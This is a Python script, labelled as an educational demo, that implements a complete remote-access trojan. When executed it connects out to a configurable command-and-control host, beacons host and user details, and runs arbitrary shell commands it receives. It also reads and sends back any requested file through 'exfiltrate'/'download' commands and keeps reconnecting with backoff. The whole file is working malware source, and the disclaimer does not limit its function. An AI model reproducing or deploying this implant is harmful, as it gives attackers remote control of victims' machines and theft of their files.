#!/usr/bin/env python3
"""
EDUCATIONAL DEMO ONLY.
Realistic RAT-style implant: beacon, persistence (reconnect), shell, file exfil.
When "opened" (executed), beacons to C2 and accepts commands.
"""
import base64
import os
import platform
import socket
import subprocess
import sys
import time

ATTACKER_HOST = os.environ.get("ATTACKER_HOST", "host.docker.internal")
ATTACKER_PORT = int(os.environ.get("ATTACKER_PORT", "4444"))
RECONNECT_DELAY = 15
RECONNECT_MAX = 3600  # cap delay at 1 hour
MAX_RESPONSE = 60 * 1024  # stay under C2 recv(65536) so output doesn't mix with next command


def _send(sock: socket.socket, data: bytes) -> None:
    sock.sendall(data)


def _recv(sock: socket.socket, size: int = 4096) -> bytes:
    return sock.recv(size)


def _beacon() -> str:
    """Build beacon payload: host, user, cwd, os, env hints."""
    host = platform.node() or "unknown"
    user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    cwd = os.getcwd()
    os_name = f"{platform.system()} {platform.release()}"
    try:
        uid = os.getuid()
    except Exception:
        uid = "N/A"
    lines = [
        f"[+] Implant active",
        f"    Host: {host}",
        f"    User: {user} (uid={uid})",
        f"    CWD:  {cwd}",
        f"    OS:   {os_name}",
    ]
    return "\n".join(lines) + "\n"


def _sysinfo() -> str:
    """Gather system info for 'info' command. Capped to MAX_RESPONSE."""
    lines = [
        _beacon().strip(),
        "---",
        "Environment (sanitized):",
    ]
    for k, v in sorted(os.environ.items()):
        if any(s in k.upper() for s in ("PASS", "SECRET", "KEY", "TOKEN")):
            lines.append(f"  {k}=***")
        else:
            lines.append(f"  {k}={v[:80]}{'...' if len(v) > 80 else ''}")
    lines.append("---")
    try:
        r = subprocess.run(
            ["ls", "-la", os.getcwd()],
            capture_output=True,
            text=True,
            timeout=5,
        )
        lines.append("CWD listing:\n" + (r.stdout or r.stderr or "(none)"))
    except Exception as e:
        lines.append(f"CWD listing: {e}")
    out = "\n".join(lines) + "\n"
    if len(out) > MAX_RESPONSE:
        out = out[: MAX_RESPONSE - 50] + "\n... (truncated)\n"
    return out


def _exfiltrate(path: str) -> str:
    """Read file and return content (base64 if binary)."""
    path = path.strip()
    if not path:
        return "exfiltrate: no path given\n"
    path = os.path.abspath(os.path.expanduser(path))
    try:
        with open(path, "rb") as f:
            raw = f.read()
    except FileNotFoundError:
        return f"exfiltrate: file not found: {path}\n"
    except PermissionError:
        return f"exfiltrate: permission denied: {path}\n"
    except Exception as e:
        return f"exfiltrate: error: {e}\n"
    if b"\x00" in raw:
        text = None
    else:
        try:
            text = raw.decode("utf-8", errors="strict")
        except UnicodeDecodeError:
            text = None
    if text is not None:
        out = f"=== FILE (text) {path} ===\n{text}\n=== END ===\n"
    else:
        b64 = base64.b64encode(raw).decode("ascii")
        out = f"=== FILE (base64) {path} ===\n{b64}\n=== END ===\n"
    if len(out) > MAX_RESPONSE:
        out = out[: MAX_RESPONSE - 50] + "\n... (truncated)\n"
    return out


def _exec(sock: socket.socket, cmd: str) -> bool:
    """Handle one command; return False to break loop. Always sends a response."""
    cmd = cmd.strip()
    if not cmd:
        return True
    if cmd.lower() in ("exit", "quit"):
        return False
    try:
        # Extended RAT commands
        if cmd.lower() == "info":
            _send(sock, _sysinfo().encode("utf-8", errors="replace"))
            return True
        if cmd.lower().startswith("download ") or cmd.lower().startswith("exfiltrate "):
            path = cmd.split(maxsplit=1)[-1]
            _send(sock, _exfiltrate(path).encode("utf-8", errors="replace"))
            return True
        # Shell
        r = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,
            cwd=os.getcwd(),
        )
        out = (r.stdout or b"") + (r.stderr or b"")
        if not out:
            out = b"(no output)\n"
        if len(out) > MAX_RESPONSE:
            out = out[:MAX_RESPONSE] + b"\n... (truncated)\n"
        _send(sock, out)
    except subprocess.TimeoutExpired:
        _send(sock, b"(command timed out)\n")
    except Exception as e:
        _send(sock, str(e).encode("utf-8", errors="replace") + b"\n")
    return True


def _session(host: str, port: int) -> None:
    """Single C2 session: beacon, then command loop."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(300)
    s.connect((host, port))
    _send(s, _beacon().encode("utf-8", errors="replace"))
    while True:
        try:
            data = _recv(s, 65536)
            if not data:
                break
            cmd = data.decode("utf-8", errors="replace").strip()
            if not _exec(s, cmd):
                break
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            break
    try:
        s.close()
    except Exception:
        pass


def main() -> None:
    delay = RECONNECT_DELAY
    while True:
        try:
            _session(ATTACKER_HOST, ATTACKER_PORT)
        except ConnectionRefusedError:
            if os.environ.get("RAT_VERBOSE"):
                print(f"C2 unreachable {ATTACKER_HOST}:{ATTACKER_PORT}", file=sys.stderr)
        except (socket.gaierror, OSError) as e:
            if os.environ.get("RAT_VERBOSE"):
                print(f"C2 error: {e}", file=sys.stderr)
        except KeyboardInterrupt:
            break
        delay = min(delay * 2, RECONNECT_MAX)
        time.sleep(delay)


if __name__ == "__main__":
    main()
